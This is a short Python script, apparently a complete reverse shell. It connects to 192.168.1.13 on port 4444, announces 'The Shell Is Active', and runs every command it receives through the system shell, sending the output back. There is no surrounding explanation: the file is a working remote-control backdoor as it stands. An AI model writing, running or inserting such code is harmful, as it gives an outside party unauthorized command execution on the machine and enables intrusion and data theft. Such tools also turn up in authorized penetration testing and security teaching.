from socket import socket,AF_INET,SOCK_STREAM
from subprocess import PIPE	, Popen
s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.13", 4444))
s.send(b'The Shell Is Active')
while True:
	data = s.recv(1024).decode("utf-8")
	process = Popen([data], stdout=PIPE, shell=True)
	command_data = process.communicate()[0]
	s.send(command_data)
s.close()
